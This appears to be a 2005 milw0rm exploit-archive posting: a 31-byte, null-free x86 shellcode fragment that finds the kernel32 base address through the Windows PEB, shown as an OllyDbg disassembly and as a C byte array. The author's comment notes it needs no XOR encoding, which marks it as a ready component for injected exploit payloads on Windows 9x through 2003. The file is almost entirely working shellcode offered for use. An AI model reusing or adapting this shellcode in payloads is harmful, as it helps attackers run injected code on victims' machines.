/*
004045F4 > 6A 30            PUSH 30
004045F6   59               POP ECX
004045F7   64:8B09          MOV ECX,DWORD PTR FS:[ECX]
004045FA   85C9             TEST ECX,ECX
004045FC   78 0C            JS SHORT OllyTest.0040460A
004045FE   8B49 0C          MOV ECX,DWORD PTR DS:[ECX+C]
00404601   8B71 1C          MOV ESI,DWORD PTR DS:[ECX+1C]
00404604   AD               LODS DWORD PTR DS:[ESI]
00404605   8B48 08          MOV ECX,DWORD PTR DS:[EAX+8]
00404608   EB 09            JMP SHORT OllyTest.00404613
0040460A   8B49 34          MOV ECX,DWORD PTR DS:[ECX+34]
0040460D   8B49 7C          MOV ECX,DWORD PTR DS:[ECX+7C]
00404610   8B49 3C          MOV ECX,DWORD PTR DS:[ECX+3C]
*/

/*
31 byte C PEB kernel base location method works on win9x-win2k3
no null bytes, so no need to xor.

-twoci
*/

unsigned char PEBCode[] =
{"\x6A\x30"
"\x59"
"\x64\x8B\x09"
"\x85\xC9"
"\x78\x0C"
"\x8B\x49\x0C"
"\x8B\x71\x1C"
"\xAD"
"\x8B\x48\x08"
"\xEB\x09"
"\x8B\x49\x34"
"\x8B\x49\x7C"
"\x8B\x49\x3C"};

int main( int argc, char *argv[] )
{
   printf( "sizeof(PEBCode) = %u\n", sizeof(PEBCode) );
   return 0;
}

// milw0rm.com [2005-01-26]